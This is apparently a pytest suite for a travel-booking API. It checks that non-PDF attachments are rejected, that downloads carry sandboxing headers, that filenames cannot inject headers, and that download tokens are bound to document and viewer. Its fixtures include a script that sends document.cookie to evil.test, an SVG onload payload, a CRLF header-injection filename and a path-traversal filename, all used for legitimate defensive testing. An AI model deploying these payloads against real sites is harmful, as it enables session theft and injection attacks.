"""H1 stored XSS via attachment content type, and L7 download tokens bound to document + viewer."""
import re

from helpers import PNG, b64, contract_pdf, inbound, login, make_entitled, quote_pdf, to_quote_stage
from sqlalchemy import select

from exjet_api.filetypes import content_disposition, sniff
from exjet_api.models import AgentAction, Document
from exjet_api.security import sign_blob

HTML = b"<html><script>fetch('https://evil.test/?c='+document.cookie)</script></html>"


def _stage(db, client, make_client):
    adm = make_client()
    return adm, to_quote_stage(db, client, adm, attachments=[])


def test_non_pdf_attachments_are_not_stored_whatever_they_claim(db, client, make_client):
    adm, s = _stage(db, client, make_client)
    atts = [
        {"filename": "evil.html", "content_type": "text/html", "content_base64": b64(HTML)},
        {"filename": "evil.svg", "content_type": "image/svg+xml", "content_base64": b64(b"<svg onload=alert(1)/>")},
        {"filename": "quote.pdf", "content_type": "application/pdf", "content_base64": b64(HTML)},  # a lie about the bytes
        {"filename": "ok-quote.pdf", "content_type": "text/html", "content_base64": b64(quote_pdf())},  # a lie the other way
        {"filename": "agreement.pdf", "content_type": "application/pdf", "content_base64": b64(contract_pdf())},
    ]
    inbound(adm, "ops-a@example.com", f"Re: [{s['ref']}] quote", "attached", atts)
    docs = db.execute(select(Document).where(Document.owner_type.in_(["quote", "contract", "email_message"]))).scalars().all()
    assert sorted(d.filename for d in docs) == ["agreement.pdf", "ok-quote.pdf"]
    assert {d.content_type for d in docs} == {"application/pdf"}  # the type WE sniffed, never the claimed one
    ev = db.execute(select(AgentAction).where(AgentAction.event == "quote.attachment_rejected")).scalar_one()
    assert ev.output["rejected"] == 3 and ev.status == "blocked"


def test_sniffing_allowlist():
    assert sniff(b"%PDF-1.7 ...") == "application/pdf" and sniff(PNG) == "image/png" and sniff(b"\xff\xd8\xffabc") == "image/jpeg"
    for bad in (HTML, b"<svg/>", b"GIF89a", b"\x00\x00", b"", b" %PDF-"):
        assert sniff(bad) is None


def test_served_documents_are_always_a_sandboxed_download(db, client, make_client):
    adm, s = _stage(db, client, make_client)
    inbound(adm, "ops-a@example.com", f"Re: [{s['ref']}] quote", "x",
            [{"filename": "q\"; x=y\r\nInjected: 1.pdf", "content_type": "text/html", "content_base64": b64(quote_pdf())},
             {"filename": "agreement.pdf", "content_base64": b64(contract_pdf())}])
    q = client.get(f"/v1/trips/{s['trip_id']}/quotes").json()[0]
    r = client.get(q["quote_pdf_url"], follow_redirects=False)
    assert r.status_code == 302 and r.headers["cache-control"] == "private, no-store"
    f = client.get(r.headers["location"])
    assert f.status_code == 200 and f.content.startswith(b"%PDF-")
    assert f.headers["content-type"] == "application/pdf"
    cd = f.headers["content-disposition"]
    assert cd.startswith("attachment;") and "\r" not in cd and "\n" not in cd and "Injected" not in f.headers
    assert f.headers["x-content-type-options"] == "nosniff"
    assert f.headers["content-security-policy"] == "sandbox; default-src 'none'"
    assert f.headers["cache-control"] == "private, no-store"


def test_content_disposition_is_rfc6266_safe():
    assert content_disposition("report.pdf") == 'attachment; filename="report.pdf"'
    h = content_disposition('a"b\r\nc d/é.pdf')
    assert "\r" not in h and "\n" not in h and '"b' not in h and h.startswith("attachment; filename=")
    assert "filename*=UTF-8''" in content_disposition("é.pdf")


def test_every_api_response_carries_security_headers(client):
    for path in ("/healthz", "/v1/billing/plans", "/v1/me", "/v1/nope"):
        h = client.get(path).headers
        assert h["x-content-type-options"] == "nosniff"
        assert h["x-frame-options"] == "DENY" and h["content-security-policy"] == "frame-ancestors 'none'"
        assert h["referrer-policy"] == "no-referrer"


def test_kyc_type_comes_from_the_bytes_and_the_storage_key_has_no_filename(db, client):
    from helpers import seed_all, signup

    seed_all(db)
    signup(client, "k@example.com")
    r = client.post("/v1/kyc/submissions", data={"kind": "individual", "holder_name": "K", "doc_types": ["passport"]},
                    files=[("files", ("../../Passport Jane Doe 1980.pdf", PNG, "application/pdf"))])
    assert r.status_code == 201
    d = db.execute(select(Document).where(Document.kind == "kyc")).scalar_one()
    assert d.content_type == "image/png"
    assert re.fullmatch(r"kyc/[0-9a-f-]{36}/[0-9a-f]{32}", d.storage_key), d.storage_key  # random: no uploader-supplied text
    assert "Jane" not in d.storage_key and "Passport" not in d.storage_key


# --------------------------------------------------------------------------- L7 token binding
def _quote_doc_url(db, client, make_client):
    adm, s = _stage(db, client, make_client)
    inbound(adm, "ops-a@example.com", f"Re: [{s['ref']}] quote", "x",
            [{"filename": "quote.pdf", "content_base64": b64(quote_pdf())}, {"filename": "agreement.pdf", "content_base64": b64(contract_pdf())}])
    q = client.get(f"/v1/trips/{s['trip_id']}/quotes").json()[0]
    return s, client.get(q["quote_pdf_url"], follow_redirects=False).headers["location"]


def test_download_token_is_bound_to_the_viewer(db, client, make_client):
    s, url = _quote_doc_url(db, client, make_client)
    assert client.get(url).status_code == 200
    other = make_client()
    make_entitled(db, other, s["admin"], "other@example.com", "Other Person")
    assert other.get(url).status_code == 404  # someone who obtained the URL cannot redeem it
    assert make_client().get(url).status_code == 404  # neither can an anonymous caller
    login(other := make_client(), "admin@example.com")
    assert other.get(url).status_code == 404  # not even an admin: the token names a different user


def test_download_token_must_name_document_and_user_and_match_the_stored_key(db, client, make_client):
    s, url = _quote_doc_url(db, client, make_client)
    token = url.rsplit("/", 1)[1]
    doc = db.execute(select(Document).where(Document.kind == "quote_pdf")).scalar_one()
    me = client.get("/v1/me").json()["user"]["id"]
    legacy = sign_blob({"k": doc.storage_key}, 120)  # the old token shape: key only
    assert client.get(f"/v1/files/{legacy}").status_code == 404
    wrong_doc = sign_blob({"k": doc.storage_key, "d": "00000000-0000-0000-0000-000000000000", "u": me}, 120)
    assert client.get(f"/v1/files/{wrong_doc}").status_code == 404
    other_key = sign_blob({"k": "kyc/x/y", "d": str(doc.id), "u": me}, 120)
    assert client.get(f"/v1/files/{other_key}").status_code == 404
    expired = sign_blob({"k": doc.storage_key, "d": str(doc.id), "u": me}, -5)
    assert client.get(f"/v1/files/{expired}").status_code == 404
    assert client.get(f"/v1/files/{token}").status_code == 200
    # a session JWT cannot be replayed as a blob token
    session = client.cookies.get("exjet_session")
    assert client.get(f"/v1/files/{session}").status_code == 404
